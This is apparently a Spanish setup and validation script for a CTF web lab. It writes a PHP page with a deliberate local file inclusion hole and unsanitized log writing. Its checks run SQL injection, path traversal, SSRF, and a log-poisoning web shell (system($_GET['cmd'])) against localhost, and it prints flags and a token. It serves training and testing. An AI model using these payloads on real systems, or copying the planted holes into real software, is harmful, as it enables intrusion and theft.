#!/bin/bash
# =============================================================================
# CTF MGP — FIX LFI (HTTP 500)
# El 500 viene de ini_set('open_basedir','') en PHP 8.3
# En PHP 8.3+, ini_set() no puede vaciar open_basedir si ya está en php.ini
# Solución: vaciarlo en php.ini de Apache (ya hecho) + quitar ini_set del código
# =============================================================================

VERDE="\e[32m"; AMARILLO="\e[33m"; ROJO="\e[31m"
AZUL="\e[34m"; NEGRITA="\e[1m"; RESET="\e[0m"

[ "$EUID" -ne 0 ] && { echo -e "${ROJO}Ejecutar como root${RESET}"; exit 1; }

echo -e "${AZUL}${NEGRITA}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   CTF MGP — Fix LFI HTTP 500                                 ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

PHP_VER=$(php -r 'echo PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION;' 2>/dev/null || echo "8.3")

# =============================================================================
# DIAGNÓSTICO
# =============================================================================
echo -e "${AMARILLO}[DIAG] Causa del HTTP 500...${RESET}"
echo -e "    Error log Apache:"
tail -5 /var/log/apache2/error.log 2>/dev/null || true
echo ""
echo -e "    open_basedir en php.ini Apache:"
grep "^open_basedir" "/etc/php/${PHP_VER}/apache2/php.ini" 2>/dev/null || \
    echo "    (no encontrado)"

# =============================================================================
# FIX 1: Asegurar open_basedir VACÍO en php.ini de Apache
# =============================================================================
echo ""
echo -e "${AMARILLO}[FIX 1] Forzando open_basedir vacío en php.ini...${RESET}"

PHP_INI="/etc/php/${PHP_VER}/apache2/php.ini"
if [ -f "$PHP_INI" ]; then
    # Comentar TODAS las líneas open_basedir (activas y comentadas con valor)
    sed -i 's|^open_basedir\s*=.*|open_basedir =|g' "$PHP_INI"
    sed -i 's|^;open_basedir\s*=.*|;open_basedir =|g' "$PHP_INI"

    # Verificar resultado
    RESULT=$(grep "^open_basedir" "$PHP_INI" || echo "(vacío — correcto)")
    echo -e "${VERDE}    [OK] $PHP_INI → $RESULT${RESET}"
else
    echo -e "${ROJO}    [ERROR] No encontrado: $PHP_INI${RESET}"
fi

# =============================================================================
# FIX 2: Reescribir index.php LFI SIN ini_set (causa el 500 en PHP 8.3)
# open_basedir ya está vacío en php.ini — ini_set ya no es necesario
# =============================================================================
echo ""
echo -e "${AMARILLO}[FIX 2] Reescribiendo LFI index.php sin ini_set...${RESET}"

tee /var/www/html/lfi/index.php > /dev/null <<'PHPEOF'
<?php
// open_basedir vacío en php.ini — no se necesita ini_set
error_reporting(0);
ini_set('display_errors', 0);

$log_file = '/var/log/app/access.log';
$ip   = $_SERVER['REMOTE_ADDR']     ?? '0.0.0.0';
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? '-';
$uri  = $_SERVER['REQUEST_URI']     ?? '/';
$page = $_GET['page']               ?? '';
$ts   = date('Y-m-d H:i:s');

// *** LOG POISONING: User-Agent escrito sin sanitizar ***
$entry = "[$ts] $ip GET $uri \"$ua\" 200\n";
@file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);

// *** LFI VULNERABLE: include() directo sin restricciones ***
if ($page !== '') {
    @include($page);
}
?><!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>COMCIBERDEF Log Viewer v2.3.1</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1a1a2e;color:#c9d1d9;font-family:sans-serif;min-height:100vh}
header{background:#16213e;border-bottom:2px solid #0f3460;padding:14px 32px;
       display:flex;align-items:center;gap:16px}
header h1{font-size:17px;color:#e94560;font-weight:700}
header span{font-size:11px;color:#718096;margin-left:auto}
.layout{display:flex;min-height:calc(100vh - 52px)}
.sidebar{width:200px;background:#16213e;border-right:1px solid #0f3460;padding:18px}
.sidebar h3{font-size:10px;text-transform:uppercase;letter-spacing:1px;
            color:#718096;margin-bottom:10px}
.sidebar a{display:block;padding:8px 10px;border-radius:5px;color:#a0aec0;
           font-size:13px;text-decoration:none;margin-bottom:3px}
.sidebar a:hover,.sidebar a.active{background:#0f3460;color:#fff}
.main{flex:1;padding:24px}
.content-area{background:#16213e;border:1px solid #0f3460;border-radius:8px;
              padding:24px;line-height:1.7}
.content-area h2{color:#e94560;margin-bottom:12px;font-size:17px}
.content-area p{color:#a0aec0;font-size:14px;margin-bottom:8px}
.content-area code{background:#0f3460;padding:2px 5px;border-radius:3px;
                   font-family:monospace;color:#63b3ed;font-size:12px}
.meta{font-size:11px;color:#4a5568;margin-top:20px;padding-top:10px;
      border-top:1px solid #0f3460}
</style>
</head>
<body>
<header>
  <h1>COMCIBERDEF Log Viewer v2.3.1</h1>
  <span>SISTEMA INTERNO</span>
</header>
<div class="layout">
  <div class="sidebar">
    <h3>Navegacion</h3>
    <a href="?page=pages/home.php"
       class="<?=($page==='pages/home.php')?'active':''?>">Inicio</a>
    <a href="?page=pages/news.php"
       class="<?=($page==='pages/news.php')?'active':''?>">Novedades</a>
    <a href="?page=pages/contact.php"
       class="<?=($page==='pages/contact.php')?'active':''?>">Soporte</a>
    <div style="margin-top:20px;padding-top:14px;border-top:1px solid #0f3460">
      <h3>Sistema</h3>
      <a href="?page=pages/home.php">Ver Logs</a>
    </div>
  </div>
  <div class="main">
    <?php if($page===''): ?>
    <div class="content-area">
      <h2>Bienvenido</h2>
      <p>Selecciona del menu o accede con <code>?page=</code></p>
      <p style="margin-top:10px">
        Logs en: <code>/var/log/app/access.log</code>
      </p>
    </div>
    <?php endif; ?>
    <div class="meta">
      Log: <?=htmlspecialchars($log_file)?> |
      IP: <?=htmlspecialchars($ip)?>
    </div>
  </div>
</div>
</body>
</html>
PHPEOF

chown www-data:www-data /var/www/html/lfi/index.php
echo -e "${VERDE}    [OK] index.php reescrito sin ini_set${RESET}"

# =============================================================================
# REINICIAR APACHE
# =============================================================================
echo ""
echo -e "${AMARILLO}[3] Reiniciando Apache...${RESET}"
systemctl restart apache2
sleep 2
echo -e "${VERDE}    [OK] Apache reiniciado${RESET}"

# =============================================================================
# VALIDACIÓN SOLO RETO 4 + RESUMEN COMPLETO
# =============================================================================
echo ""
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo -e "${NEGRITA}  VALIDACIÓN FINAL COMPLETA${RESET}"
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo ""

PASS=0; FAIL=0
ok()   { echo -e "  ${VERDE}[OK]${RESET}   $1"; PASS=$((PASS+1)); }
fail() { echo -e "  ${ROJO}[FAIL]${RESET} $1"; FAIL=$((FAIL+1)); }
chk_http() {
    local C; C=$(curl -s -o /dev/null -w "%{http_code}" "$2" 2>/dev/null || echo "000")
    [ "$C" = "$3" ] && ok "$1 (HTTP $C)" || fail "$1 (esperado $3, got $C)"
}
chk_body() {
    local B; B=$(curl -s "$2" 2>/dev/null || echo "")
    echo "$B" | grep -q "$3" && ok "$1" || fail "$1"
}

echo -e "${AMARILLO}── Reto 1: SQLi Login ──────────────────────────────${RESET}"
chk_http "/sqli-login/" "http://localhost/sqli-login/" "200"
B=$(curl -sL --data "username=%27+OR+1%3D1+LIMIT+4%2C1+--+-&password=x" \
    "http://localhost/sqli-login/" 2>/dev/null)
echo "$B" | grep -q "Comciberdef{sqli_bypass_2026_ok}" && \
    ok "SQLi bypass → flag" || fail "SQLi bypass"

echo ""
echo -e "${AMARILLO}── Reto 2: XSS (/xss/) ─────────────────────────────${RESET}"
chk_http "/xss/ accesible"     "http://localhost/xss/"                          "200"
chk_body "Refleja input"       "http://localhost/xss/search.php?query=CTF2026"  "CTF2026"
HDRS=$(curl -sI "http://localhost/xss/search.php?query=x" 2>/dev/null || echo "")
echo "$HDRS" | grep -qi "Comciberdef{xss_reflected_2026_found}" && \
    ok "Cookie session_flag presente" || fail "Cookie session_flag ausente"

echo ""
echo -e "${AMARILLO}── Reto 3: SQLi Ciega ───────────────────────────────${RESET}"
chk_http "/sqli-blind/" "http://localhost/sqli-blind/" "200"
chk_body "Oráculo TRUE"  "http://localhost/sqli-blind/?id=1+AND+1%3D1" "encontrado"
chk_body "Oráculo FALSE" "http://localhost/sqli-blind/?id=1+AND+1%3D2" "no disponible"
HASH=$(mysql -u root -e \
    "SELECT password_hash FROM blind_db.moderators WHERE username='paco_admin';" \
    -sN 2>/dev/null || echo "X")
EXP=$(echo -n "NavalCiber2026" | md5sum | cut -d' ' -f1)
[ "$HASH" = "$EXP" ] && ok "Hash MD5 paco_admin correcto" || \
    fail "Hash MD5 incorrecto ($HASH)"

echo ""
echo -e "${AMARILLO}── Reto 4: LFI + Log Poisoning ──────────────────────${RESET}"
chk_http "/lfi/ accesible"    "http://localhost/lfi/"                          "200"
chk_body "LFI lee /etc/passwd" "http://localhost/lfi/?page=../../../etc/passwd" "root:x"
[ -f /flag.txt ] && ok "/flag.txt existe" || fail "/flag.txt no existe"
# Test Log Poisoning
curl -s -A '<?php system($_GET["cmd"]); ?>' \
    "http://localhost/lfi/?page=pages/home.php" > /dev/null 2>&1
sleep 0.5
chk_body "Log Poisoning + RCE → /flag.txt" \
    "http://localhost/lfi/?page=/var/log/app/access.log&cmd=cat+/flag.txt" \
    "Comciberdef"
# Limpiar log
printf '[2026-01-15 08:00:00] 192.168.125.40 GET /lfi/ "Mozilla/5.0" 200\n' \
    > /var/log/app/access.log
chown www-data:www-data /var/log/app/access.log

echo ""
echo -e "${AMARILLO}── Reto 5: SSRF ─────────────────────────────────────${RESET}"
[ "$(systemctl is-active ctf-metadata 2>/dev/null)" = "active" ] && \
    ok "ctf-metadata activo" || fail "ctf-metadata inactivo"
[ "$(systemctl is-active ctf-storage 2>/dev/null)" = "active" ] && \
    ok "ctf-storage activo" || fail "ctf-storage inactivo"
TOKEN="MGP2026-IAM-xK9mN3pQ7rT1vY5wZ8"
F=$(curl -s -H "Authorization: Bearer $TOKEN" \
    "http://127.0.0.1:9999/secret/flag.txt" 2>/dev/null)
echo "$F" | grep -q "Comciberdef{ssrf_bypass_2026_master}" && \
    ok "Storage entrega flag" || fail "Storage no entrega flag"
chk_body "SSRF bypass 0.0.0.0" \
    "http://localhost/ssrf/preview.php?url=http://0.0.0.0:8888/latest/meta-data/iam/security-credentials/mgp-role" \
    "Token"
chk_http "/ssrf/" "http://localhost/ssrf/" "200"

# RESUMEN
echo ""
TOTAL=$((PASS+FAIL))
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
printf "${NEGRITA}  RESULTADO: %d/%d controles pasados\n${RESET}" "$PASS" "$TOTAL"
if [ "$FAIL" -eq 0 ]; then
    echo -e "${VERDE}${NEGRITA}  ✓ TODOS LOS RETOS WEB LISTOS PARA EL CTF${RESET}"
else
    echo -e "${ROJO}${NEGRITA}  ✗ $FAIL fallaron${RESET}"
    echo ""
    echo -e "${AMARILLO}  Diagnóstico LFI si sigue fallando:${RESET}"
    echo "    curl -v http://localhost/lfi/ 2>&1 | head -5"
    echo "    tail -5 /var/log/apache2/error.log"
    echo "    php -r \"echo ini_get('open_basedir');\""
fi
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo ""
echo -e "${NEGRITA}  URLs DEFINITIVAS:${RESET}"
echo "  R1 → http://192.168.125.150/sqli-login/  │ Comciberdef{sqli_bypass_2026_ok}"
echo "  R2 → http://192.168.125.150/xss/         │ Comciberdef{xss_reflected_2026_found}"
echo "  R3 → http://192.168.125.150/sqli-blind/  │ Comciberdef{NavalCiber2026}"
echo "  R4 → http://192.168.125.150/lfi/         │ Comciberdef{lfi_log_poison_rce_2026}"
echo "  R5 → http://192.168.125.150/ssrf/        │ Comciberdef{ssrf_bypass_2026_master}"
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
